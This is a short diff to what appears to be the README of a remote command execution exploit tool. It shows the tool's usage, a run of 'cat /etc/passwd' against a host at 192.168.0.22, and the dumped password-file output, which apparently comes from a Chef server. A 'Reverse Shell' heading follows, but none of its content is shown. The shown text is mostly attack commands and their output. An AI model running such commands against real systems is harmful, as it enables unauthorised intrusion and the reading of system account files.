@@ -5,7 +5,8 @@ Remote Command Execution
 $ python2 cmd.py
 Usage: cmd.py http://example.com whoami
 
-python2 cmd.py http://192.168.0.22 'cat /etc/passwd'system("cat /etc/passwd") was sent successfully, response:
+python2 cmd.py http://192.168.0.22 'cat /etc/passwd'
+system("cat /etc/passwd") was sent successfully, response:
 root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologin[snip]opscode-pgsql:x:996:996::/var/opt/opscode/postgresql:/bin/shstring(60) "opscode-pgsql:x:996:996::/var/opt/opscode/postgresql:/bin/sh
 ```
 ## Reverse Shell 
